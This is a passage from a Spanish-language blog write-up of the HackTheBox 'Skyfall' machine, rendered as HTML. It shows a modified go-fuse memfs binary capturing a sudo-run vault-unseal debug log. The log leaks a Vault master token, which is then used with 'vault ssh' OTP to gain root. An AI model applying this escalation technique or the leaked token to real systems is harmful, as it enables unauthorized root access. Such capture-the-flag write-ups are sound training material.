</span></span><span class=line><span class=cl>	<span class=nx>conn</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewFileSystemConnector</span><span class=p>(</span><span class=nx>root</span><span class=p>,</span> <span class=kc>nil</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>fuse</span><span class=p>.</span><span class=nf>NewServer</span><span class=p>(</span><span class=nx>conn</span><span class=p>.</span><span class=nf>RawFS</span><span class=p>(),</span> <span class=nx>mountPoint</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>fuse</span><span class=p>.</span><span class=nx>MountOptions</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>Debug</span><span class=p>:</span> <span class=o>*</span><span class=nx>debug</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Mount fail: %v\n&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Mounted!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>.</span><span class=nf>Serve</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>En las opciones de variable puedo ver <code>fuse.MountOptions</code>. Si chequeamos el c√≥digo de la librer√≠a <code>fuse</code> que est√° siendo llamado (<code>fuse/api.go</code>) tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=p>&lt;</span><span class=nx>SNIP</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>MountOptions</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>AllowOther</span> <span class=kt>bool</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Options are passed as -o string to fusermount.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>Options</span> <span class=p>[]</span><span class=kt>string</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Default is _DEFAULT_BACKGROUND_TASKS, 12.  This numbers
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// controls the allowed number of requests that relate to
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// async I/O.  Concurrency for synchronous I/O is not limited.
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>MaxBackground</span> <span class=kt>int</span>
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nx>SNIP</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>donde puedo ver la variable <code>AllowOther</code>, la cual es una variable de tipo booleano. De manera que agregamos esta variable en el c√≥digo para que sea <code>true</code>. Por tanto, el c√≥digo fuente de <code>main.go</code> ahora es:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=c1>// Copyright 2016 the Go-FUSE Authors. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=c1>// Use of this source code is governed by a BSD-style
</span></span></span><span class=line><span class=cl><span class=c1>// license that can be found in the LICENSE file.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=c1>// Mounts MemNodeFs for testing purposes.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;flag&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/hanwen/go-fuse/v2/fuse/nodefs&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Scans the arg list and sets up flags
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>debug</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Bool</span><span class=p>(</span><span class=s>&#34;debug&#34;</span><span class=p>,</span> <span class=kc>false</span><span class=p>,</span> <span class=s>&#34;print debugging messages.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>flag</span><span class=p>.</span><span class=nf>Parse</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>NArg</span><span class=p>()</span> <span class=p>&lt;</span> <span class=mi>2</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=c1>// TODO - where to get program name?
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;usage: main MOUNTPOINT BACKING-PREFIX&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>mountPoint</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>prefix</span> <span class=o>:=</span> <span class=nx>flag</span><span class=p>.</span><span class=nf>Arg</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>root</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewMemNodeFSRoot</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>conn</span> <span class=o>:=</span> <span class=nx>nodefs</span><span class=p>.</span><span class=nf>NewFileSystemConnector</span><span class=p>(</span><span class=nx>root</span><span class=p>,</span> <span class=kc>nil</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>fuse</span><span class=p>.</span><span class=nf>NewServer</span><span class=p>(</span><span class=nx>conn</span><span class=p>.</span><span class=nf>RawFS</span><span class=p>(),</span> <span class=nx>mountPoint</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>fuse</span><span class=p>.</span><span class=nx>MountOptions</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>Debug</span><span class=p>:</span> <span class=o>*</span><span class=nx>debug</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nx>AllowOther</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span> <span class=c1>// LINEA MODIFICADA
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>})</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Mount fail: %v\n&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Mounted!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>server</span><span class=p>.</span><span class=nf>Serve</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>y lo constru√≠mos/compilamos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ go build -o memfs_modified
</span></span></span></code></pre></div><p>Repetimos los pasos para transferir el archivo, le asignamos permisos de ejecuci√≥n y volvemos a correr el binario modificado en la m√°quina v√≠ctima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ ./memfs_modified
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>usage: main MOUNTPOINT BACKING-PREFIX
</span></span></span><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ ./memfs_modified output/ test
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mounted!
</span></span></span></code></pre></div><p>y en la otra terminal/sesi√≥n entramos al directorio <code>output</code> y corremos el comando con <code>sudo</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ cd output
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>askyy@skyfall:/dev/shm/output$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Reading: /etc/vault-unseal.yaml
</span></span></span><span class=line><span class=cl><span class=go>[-] Security Risk!
</span></span></span><span class=line><span class=cl><span class=go>[+] Found Vault node: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Check interval: 5s
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Max checks: 5
</span></span></span><span class=line><span class=cl><span class=go>[&gt;] Checking seal status
</span></span></span><span class=line><span class=cl><span class=go>[+] Vault sealed: false
</span></span></span></code></pre></div><p>Ahora tenemos nuevos archivos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ ls
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>memfs  memfs_modified  output  test1
</span></span></span></code></pre></div><p>Podemos leer el contenido de <code>test1</code>, el cual deber√≠a de contener el mismo contenido del archivo <code>debug.log</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>askyy@skyfall:/dev/shm$ cat test1
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>2024/09/01 01:23:21 Initializing logger...
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Reading: /etc/vault-unseal.yaml
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Security Risk!
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Found Vault node: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Check interval: 5s
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Max checks: 5
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Establishing connection to Vault...
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Checking seal status
</span></span></span><span class=line><span class=cl><span class=go>2024/09/01 01:23:21 Vault sealed: false
</span></span></span></code></pre></div><p>Donde puedo un nuevo <code>VAULT_TOKEN</code> con valor <code>hvs.I0ewVsmaKU1SwVZAKR3T0mmG</code>.</p><p>Recuerdo que ten√≠amos una llave <code>admin_otp_key_role</code> la primera vez que nos tratamos de loguear por <code>SSH</code> y se nos deneg√≥ el acceso. ¬øQu√© tal si actualizamos los par√°metros y tratamos de loguearnos con este nuevo token? Dado que es un token con nombre &ldquo;admin&rdquo;, podr√≠amos tratar de utilizarlo para loguearnos como <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ export VAULT_ADDR=&#34;http://prd23-vault-internal.skyfall.htb/&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_ADDR=&#34;http://prd23-vault-internal.skyfall.htb/&#34;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ export VAULT_TOKEN=&#34;hvs.I0ewVsmaKU1SwVZAKR3T0mmG&#34;
</span></span></span></code></pre></div><p>Y, finalmente, tratamos de conectarnos via <code>SSH</code> como el usuario <code>root</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ./vault ssh -role admin_otp_key_role -mode otp root@10.10.11.254
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46
</span></span></span><span class=line><span class=cl><span class=go>root@skyfall:~# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root
</span></span></span></code></pre></div><p>¬°Funcion√≥! Podemos leer la flag del usuario root en el directorio <code>/root</code>. GG.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>